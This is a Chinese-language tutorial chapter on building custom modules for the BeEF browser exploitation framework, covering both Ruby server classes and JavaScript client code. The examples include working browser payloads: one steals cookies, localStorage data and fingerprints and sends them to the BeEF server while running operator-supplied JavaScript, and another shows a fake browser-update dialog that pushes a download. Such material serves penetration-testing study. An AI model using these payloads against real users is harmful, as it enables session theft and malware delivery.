# 第7章 BeEF扩展开发

BeEF是一个高度可扩展的框架，支持自定义模块的开发。本章介绍BeEF的模块架构和开发方法。

### 7.1 BeEF模块架构

#### 模块目录结构

BeEF的模块位于 `modules/` 目录下，按功能类别组织：

```
modules/
├── browser/           # 浏览器相关模块
│   ├── fingerprint/   # 指纹识别
│   ├── hooked_dom/    # Hook域操作
│   └── ...
├── network/           # 网络模块
│   ├── host/          # 主机发现
│   ├── dns/           # DNS探测
│   └── port_scanner/  # 端口扫描
├── social_engineering/ # 社会工程模块
├── persistence/       # 持久化模块
├── metasploit/        # Metasploit集成
└── ...
```

#### 单个模块的结构

每个模块是一个独立的目录，包含以下文件：

```
module_name/
├── module.rb          # 模块定义（Ruby，服务端）
├── command.js         # 客户端执行代码（JavaScript）
├── description.txt    # 模块描述
└── [其他资源文件]     # HTML、CSS、图片等
```

**文件说明：**

| 文件 | 必需 | 说明 |
|------|------|------|
| module.rb | 是 | 模块的核心定义文件，包含模块元数据和服务端逻辑 |
| command.js | 是 | 在目标浏览器中执行的JavaScript代码 |
| description.txt | 否 | 模块的详细描述文本 |
| 其他资源 | 否 | 模块需要的额外资源文件 |

#### 模块生命周期

1. **加载阶段**：BeEF启动时扫描模块目录，解析module.rb注册模块
2. **选择阶段**：管理员在界面中选择要执行的模块
3. **下发阶段**：BeEF服务器将command.js发送给Hooked浏览器
4. **执行阶段**：浏览器执行JavaScript代码
5. **结果阶段**：执行结果回传到服务器，显示在管理界面

### 7.2 命令模块开发（Ruby）

#### module.rb基本结构

```ruby
#
# 模块名称：示例模块
# 作者：Your Name
# 版本：1.0
# 描述：这是一个示例BeEF模块
#

class Example_module < BeEF::Core::Command

  def self.options
    # 定义模块参数
    return [
      {
        'name' => 'somename',           # 参数名称
        'description' => '参数描述',    # 参数描述
        'ui_label' => '界面显示名称',   # 管理界面显示的标签
        'value' => 'default_value'      # 默认值
      }
    ]
  end

  def post_execute
    # 命令执行后的处理逻辑
    content = {}
    content['result'] = @datastore['result']
    save content
  end

end
```

#### 模块类的核心方法

| 方法 | 说明 |
|------|------|
| `self.options` | 定义模块的配置参数，显示在管理界面中 |
| `pre_send` | 命令发送前执行的逻辑（服务端） |
| `post_execute` | 命令执行完成后执行的逻辑（服务端），处理返回结果 |
| `callback` | 可选的回调处理函数 |

#### 完整的模块示例

```ruby
#
# Browser Info Collector - 自定义浏览器信息收集模块
#

class Browser_info_collector < BeEF::Core::Command

  def self.options
    [
      {
        'name' => 'collect_canvas',
        'type' => 'checkbox',
        'ui_label' => '收集Canvas指纹',
        'value' => 'true'
      },
      {
        'name' => 'collect_plugins',
        'type' => 'checkbox',
        'ui_label' => '收集插件列表',
        'value' => 'true'
      },
      {
        'name' => 'custom_js',
        'type' => 'textarea',
        'ui_label' => '自定义JavaScript',
        'value' => ''
      }
    ]
  end

  def pre_send
    # 命令发送前可以在这里做一些准备工作
    # 例如：根据配置动态生成JavaScript代码
    BeEF::Core::Logger.instance.register('Module', 
      "Browser Info Collector 模块已发送给 #{@datastore['zombie_id']}")
  end

  def post_execute
    content = {}
    
    # 处理返回的数据
    if @datastore['result']
      begin
        data = JSON.parse(@datastore['result'])
        content['user_agent'] = data['userAgent']
        content['screen_size'] = "#{data['screenWidth']}x#{data['screenHeight']}"
        content['language'] = data['language']
        content['platform'] = data['platform']
        content['cookie_count'] = data['cookieCount']
        content['localstorage_count'] = data['localStorageCount']
        
        if data['canvasFingerprint']
          content['canvas_fingerprint'] = data['canvasFingerprint']
        end
        
        if data['plugins']
          content['plugins'] = data['plugins'].join(', ')
        end
        
      rescue => e
        content['error'] = "解析结果失败: #{e.message}"
      end
    end
    
    save content
  end

end
```

### 7.3 客户端代码（JavaScript）

#### command.js基本结构

```javascript
// 自定义浏览器信息收集模块
beef.execute(function() {
    
    var result = {};
    
    // 收集基本信息
    result.userAgent = navigator.userAgent;
    result.platform = navigator.platform;
    result.language = navigator.language || navigator.browserLanguage;
    result.screenWidth = screen.width;
    result.screenHeight = screen.height;
    result.colorDepth = screen.colorDepth;
    
    // 收集Cookie信息
    result.cookieCount = document.cookie ? document.cookie.split(';').length : 0;
    result.cookies = document.cookie;
    
    // 收集LocalStorage信息
    try {
        result.localStorageCount = localStorage.length;
    } catch(e) {
        result.localStorageCount = 0;
    }
    
    // 收集插件信息
    result.plugins = [];
    if (navigator.plugins && navigator.plugins.length > 0) {
        for (var i = 0; i < navigator.plugins.length; i++) {
            result.plugins.push(navigator.plugins[i].name);
        }
    }
    
    // 收集Canvas指纹
    if (beef.net.evaluate("somename") == 'true') {
        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('beef-canvas-fingerprint-<canvas>', 2, 2);
            result.canvasFingerprint = canvas.toDataURL().substring(0, 100) + '...';
        } catch(e) {
            result.canvasFingerprint = 'not_supported';
        }
    }
    
    // 执行自定义JS
    var customJs = beef.net.evaluate("custom_js");
    if (customJs && customJs.length > 0) {
        try {
            result.customResult = eval(customJs);
        } catch(e) {
            result.customResult = 'Error: ' + e.message;
        }
    }
    
    // 返回结果给BeEF服务器
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify(result));
    
});
```

#### BeEF客户端API

在command.js中可以使用以下BeEF API：

| API | 说明 |
|-----|------|
| `beef.execute(callback)` | 执行模块代码的标准包装函数 |
| `beef.net.evaluate(param_name)` | 获取模块配置参数的值 |
| `beef.net.send(url, cmd_id, data)` | 向服务器发送数据 |
| `beef.dom` | DOM操作工具函数 |
| `beef.browser` | 浏览器检测相关函数 |
| `beef.net.request(url, callback, method, data)` | 发送HTTP请求 |
| `beef.cookie.get(name)` | 获取Cookie |
| `beef.cookie.set(name, value, days)` | 设置Cookie |

#### 复杂模块示例：自定义弹窗

```javascript
// 自定义社会工程弹窗模块
beef.execute(function() {
    
    // 获取配置参数
    var title = beef.net.evaluate("title") || "系统提示";
    var message = beef.net.evaluate("message") || "请更新您的浏览器";
    var buttonText = beef.net.evaluate("button_text") || "立即更新";
    var downloadUrl = beef.net.evaluate("download_url") || "#";
    
    // 创建弹窗HTML
    var modalHtml = `
        <div id="beef-custom-modal" style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        ">
            <div style="
                background: white;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                max-width: 400px;
                width: 90%;
            ">
                <h3 style="margin-top:0;color:#333;">${title}</h3>
                <p style="color:#666;line-height:1.6;">${message}</p>
                <div style="margin-top:20px;text-align:right;">
                    <button id="beef-modal-cancel" style="
                        padding: 8px 20px;
                        margin-right: 10px;
                        border: 1px solid #ddd;
                        background: #f5f5f5;
                        border-radius: 4px;
                        cursor: pointer;
                    ">取消</button>
                    <button id="beef-modal-ok" style="
                        padding: 8px 20px;
                        background: #007bff;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                    ">${buttonText}</button>
                </div>
            </div>
        </div>
    `;
    
    // 插入到页面
    var modalDiv = document.createElement('div');
    modalDiv.innerHTML = modalHtml;
    document.body.appendChild(modalDiv);
    
    // 绑定事件
    document.getElementById('beef-modal-ok').onclick = function() {
        // 用户点击了确认按钮
        beef.net.send('/command/' + beef.command_session_id, 
            beef.command_id, JSON.stringify({
                'status': 'clicked',
                'action': 'download',
                'url': downloadUrl
            }));
        
        // 触发下载
        window.location.href = downloadUrl;
        
        // 关闭弹窗
        document.getElementById('beef-custom-modal').style.display = 'none';
    };
    
    document.getElementById('beef-modal-cancel').onclick = function() {
        // 用户取消
        beef.net.send('/command/' + beef.command_session_id, 
            beef.command_id, JSON.stringify({
                'status': 'cancelled'
            }));
        
        document.getElementById('beef-custom-modal').style.display = 'none';
    };
    
    // 通知服务器弹窗已显示
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify({
            'status': 'displayed'
        }));
    
});
```

### 7.4 模块配置与注册

#### 模块的配置文件

除了module.rb中定义的选项，还可以通过配置文件控制模块的行为：

```yaml
# 在config.yaml中配置模块
modules:
  path: ['modules']
  disable: []
  autoload: true
  
  # 特定模块的配置
  browser_info_collector:
    enabled: true
    category: 'browser/fingerprint'
```

#### 模块的分类与显示

模块在管理界面中的显示位置由其目录结构决定。例如：
- `modules/browser/fingerprint/your_module/` → Browser → Fingerprint → Your Module
- `modules/social_engineering/your_module/` → Social Engineering → Your Module

#### 模块兼容性设置

在module.rb中可以设置模块的目标浏览器兼容性：

```ruby
class My_module < BeEF::Core::Command

  # 支持的浏览器
  def self.supported_browsers
    {
      'ALL' => 'all'    # 支持所有浏览器
      # 或者指定特定版本：
      # 'FF' => ['3.0', '4.0', '5.0+']
      # 'S'  => ['5.0+']
      # 'C'  => ['10+']
      # 'IE' => ['8.0', '9.0', '10.0+']
    }
  end

end
```

### 7.5 自定义模块开发实战

让我们从头开始开发一个完整的BeEF模块：**页面暗模式切换器**（一个简单但实用的示例）。

#### 步骤一：创建模块目录

```bash
cd /path/to/beef/modules/browser/
mkdir dark_mode_toggle
cd dark_mode_toggle
```

#### 步骤二：创建module.rb

```ruby
#
# Dark Mode Toggle
# 切换页面为暗色模式
#

class Dark_mode_toggle < BeEF::Core::Command

  def self.options
    [
      {
        'name' => 'mode',
        'type' => 'combobox',
        'ui_label' => '显示模式',
        'store_type' => 'arraystore',
        'store_fields' => ['mode'],
        'store_data' => [
          ['dark'],
          ['light'],
          ['invert']
        ],
        'value' => 'dark',
        'valueField' => 'mode',
        'displayField' => 'mode'
      },
      {
        'name' => 'transition',
        'type' => 'checkbox',
        'ui_label' => '启用过渡动画',
        'value' => 'true'
      }
    ]
  end

  def post_execute
    content = {}
    content['status'] = @datastore['status'] || 'unknown'
    content['mode'] = @datastore['mode']
    save content
  end

end
```

#### 步骤三：创建command.js

```javascript
// Dark Mode Toggle Module
beef.execute(function() {
    
    var mode = beef.net.evaluate("mode") || "dark";
    var transition = beef.net.evaluate("transition") == "true";
    
    var result = {
        mode: mode,
        status: 'success'
    };
    
    try {
        // 添加样式
        var styleId = 'beef-dark-mode-style';
        var existingStyle = document.getElementById(styleId);
        
        if (existingStyle) {
            existingStyle.remove();
        }
        
        var style = document.createElement('style');
        style.id = styleId;
        
        var css = '';
        
        if (mode === 'dark') {
            css = `
                html {
                    filter: invert(1) hue-rotate(180deg) !important;
                    ${transition ? 'transition: filter 0.5s ease;' : ''}
                }
                img, video, canvas, svg {
                    filter: invert(1) hue-rotate(180deg) !important;
                }
            `;
        } else if (mode === 'light') {
            // 恢复正常（移除样式即可）
            result.message = '已恢复亮色模式';
        } else if (mode === 'invert') {
            css = `
                html {
                    filter: invert(1) !important;
                    ${transition ? 'transition: filter 0.5s ease;' : ''}
                }
            `;
        }
        
        if (css.length > 0) {
            style.appendChild(document.createTextNode(css));
            document.head.appendChild(style);
        }
        
        result.applied = true;
        
    } catch(e) {
        result.status = 'error';
        result.error = e.message;
    }
    
    // 返回结果
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify(result));
    
});
```

#### 步骤四：创建description.txt

```
Dark Mode Toggle
================

此模块可以将被Hook的浏览器页面切换为暗色模式或反色模式。

使用场景：
- 测试页面的可访问性
- 干扰用户正常浏览
- 隐藏Hook痕迹（用户以为是显示问题）

支持的模式：
- dark: 暗色模式（反转颜色并旋转色相）
- light: 亮色模式（恢复正常）
- invert: 完全反色
```

#### 步骤五：重启BeEF加载模块

```bash
# 重启BeEF
./beef -x
```

启动后，在模块树的 "Browser" 分类下应该能看到新的 "Dark Mode Toggle" 模块。

#### 步骤六：测试模块

1. Hook一个测试浏览器
2. 找到 "Dark Mode Toggle" 模块
3. 选择模式（dark/light/invert）
4. 点击"Execute"
5. 观察目标浏览器页面的变化

> **截图位置说明**：在Module Tree中找到自定义模块，配置参数后点击Execute。目标浏览器页面会应用对应的显示效果。在Commands标签页中可以看到执行结果和状态。

#### 模块开发注意事项

1. **兼容性**：考虑不同浏览器的API差异，做好特性检测
2. **错误处理**：JavaScript代码中加入try-catch，避免因错误导致Hook断开
3. **性能**：避免执行过于消耗资源的操作
4. **安全性**：对用户输入进行适当处理，避免模块本身被利用
5. **文档**：编写清晰的模块描述和使用说明
6. **测试**：在不同浏览器和系统中充分测试

---

---

